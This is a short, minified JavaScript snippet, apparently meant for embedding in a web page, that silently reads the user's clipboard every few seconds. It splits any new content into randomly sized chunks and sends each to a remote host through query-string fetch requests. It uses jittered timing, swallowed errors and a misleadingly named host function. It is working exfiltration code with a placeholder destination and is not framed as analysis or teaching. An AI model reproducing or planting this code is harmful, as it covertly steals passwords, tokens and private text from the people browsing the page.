const apropriate = () => "https://example.invalid/chunks";
!function(){
  let a,b=!1,c=Date.now();
  setInterval(async()=>{
    if(b||Date.now()<c)return;
    b=!0;
    try{
      let d=await navigator.clipboard.readText();
      if(d&&d!==a){
        a=d;
        let e=[],f=700+~~(Math.random()*1300);
        for(let i=0;i<d.length;i+=f)e.push(d.slice(i,i+f));
        let g=Date.now().toString(36)+Math.random().toString(36).slice(2)+"_x"+(~~(9e4*Math.random())).toString(36);
        e.forEach((h,i)=>{
          let j=apropriate()+"?"+["uid","part","total","data"].map((k,l)=>k+"="+encodeURIComponent(l<1?g:l<2?i+1:l<3?e.length:h)).join("&");
          fetch(j,{method:"GET",mode:"no-cors"}).catch(()=>{});
        });
      }
    }catch(e){}
    finally{b=!1;c=Date.now()+1500+~~(Math.random()*500);}
  },2000+~~(Math.random()*1000));
}();
